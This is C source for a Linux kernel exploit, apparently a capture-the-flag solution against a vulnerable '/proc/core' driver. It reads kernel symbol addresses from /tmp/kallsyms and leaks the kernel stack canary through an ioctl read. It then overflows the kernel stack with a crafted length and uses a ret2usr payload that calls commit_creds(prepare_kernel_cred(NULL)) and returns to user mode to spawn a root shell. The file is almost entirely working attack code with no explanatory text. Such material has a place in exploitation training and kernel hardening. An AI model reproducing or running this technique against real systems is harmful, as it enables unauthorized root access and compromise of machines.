#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/ioctl.h>

size_t commit_creds = 0,prepare_kernel_cred = 0;
size_t kernel_base = 0xffffffff81000000, kernel_offset;

size_t user_cs,user_ss,user_rflags,user_sp;
void save_status(void)
{
    // save the regs
    asm volatile(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("[*] Status has been saved...\n");
}
void core_read(int fd,char *buf)
{
    ioctl(fd,0x6677889B,buf);
}
void set_off_val(int fd,size_t off)
{
    ioctl(fd,0x6677889C,off);
}
void core_copy(int fd,size_t nbytes)
{
    ioctl(fd,0x6677889A,nbytes);
}
void get_shell()
{
    system("/bin/sh");
}

#define COMMIT_CREDS 0xffffffff8109c8e0
#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da

void* (*prepare_kernel_cred_kfunc)(void *task_struct);
int (*commit_creds_kfunc)(void *cred);

void ret2usr_attack(void)
{
    prepare_kernel_cred_kfunc = (void*(*)(void*)) prepare_kernel_cred;
    commit_creds_kfunc = (int (*)(void*)) commit_creds;
    (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));
    asm volatile(
        "mov rax, user_ss;"
        "push rax;"
        "mov rax, user_sp;"
        "sub rax, 8;"   /* stack balance */
        "push rax;"
        "mov rax, user_rflags;"
        "push rax;"
        "mov rax, user_cs;"
        "push rax;"
        "lea rax, get_shell;"
        "push rax;"
        "swapgs;"
        "iretq;"
    );
}

void explotation()
{
    FILE *ksyms_file;
    int fd;
    char buf[0x1000],type[0x10];
    size_t addr;
    size_t canary;
    size_t rop_chain[0x100],i;
    
    printf("[*] Start to exploit...\n");
    save_status();
    fd = open("/proc/core",O_RDWR);
    if(fd < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    // get address of kernel symbols
    printf("[*] Reading /tmp/kallsyms...\n");
    ksyms_file = fopen("/tmp/kallsyms","r");
    if(ksyms_file == NULL){
        perror("fopen");
        exit(EXIT_FAILURE);
    }
    while(fscanf(ksyms_file,"%lx%s%s",&addr,type,buf))
    {
        if(prepare_kernel_cred && commit_creds) break;
        if(!commit_creds && !strcmp(buf,"commit_creds")){
            commit_creds = addr;
            printf("[+] Successful to get the addr of commit_cread: 0x%lx\n", commit_creds);
            continue;
        }
        if(!prepare_kernel_cred && !strcmp(buf,"prepare_kernel_cred")){
            prepare_kernel_cred = addr;
            printf("[+] Successful to get the addr of prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
            continue;
        }
    }
    kernel_offset = commit_creds-COMMIT_CREDS;
    kernel_base+= kernel_offset;
    printf("[+] Successful to get the addr of kernel_base and kernel_offset: 0x%lx and 0x%lx\n",kernel_base,kernel_offset);

    sleep(3);
    // reading canary addr
    printf("[+] Reading value of kernel stack canary...\n");
    set_off_val(fd,64);
    core_read(fd,buf);
    canary = ((size_t*)buf)[0];
    printf("[+] Got kernel stack canary: 0x%lx\n",canary);

    // construct the rop chain
    for(i = 0;i < 10;i++)    rop_chain[i] = canary;
    rop_chain[i++] = (size_t) ret2usr_attack;

    printf("[*] Start to exploit...\n");

    write(fd,rop_chain,0x800);
    core_copy(fd,0xffffffffffff0000 | (0x100));

}

int main(int argc,char **argv)
{
    explotation();
    return 0;
}